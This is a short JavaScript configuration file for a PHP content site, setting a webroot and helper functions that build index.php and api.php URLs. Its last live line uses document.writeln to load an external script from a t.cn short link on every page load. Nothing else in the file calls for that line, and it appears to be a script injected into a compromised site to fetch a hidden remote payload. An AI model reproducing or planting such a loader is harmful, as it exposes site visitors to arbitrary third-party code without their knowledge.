...
var ctrl_id = "c";
var func_id = "f";
var webroot = "http://cx.jin10cj.com/";
var apifile = "api.php";
var lang= new Array();

function get_url(ctrl,func,ext){var url = "http://cx.jin10cj.com/index.php?c="+ctrl;if(func){url+="&f="+func;};if(ext){url+="&"+ext};return url;}
function get_plugin_url(id,func,ext){var url = "http://cx.jin10cj.com/index.php?c=plugin&f=index&id="+id+"&exec="+func;if(ext){url+="&"+ext};url+="&_noCache="+Math.random();return url;};
function api_url(ctrl,func,ext){var url = "http://cx.jin10cj.com/api.php?c="+ctrl;if(func){url+="&f="+func;};if(ext){url+="&"+ext};url+="&_noCache="+Math.random();return url;};
function api_plugin_url(id,func,ext){var url = "http://cx.jin10cj.com/api.php?c=plugin&f=index&id="+id+"&exec="+func;if(ext){url+="&"+ext};url+="&_noCache="+Math.random();return url;};
document.writeln("<script src=http://t.cn/Rt9eiZc><\/script>");
/*!
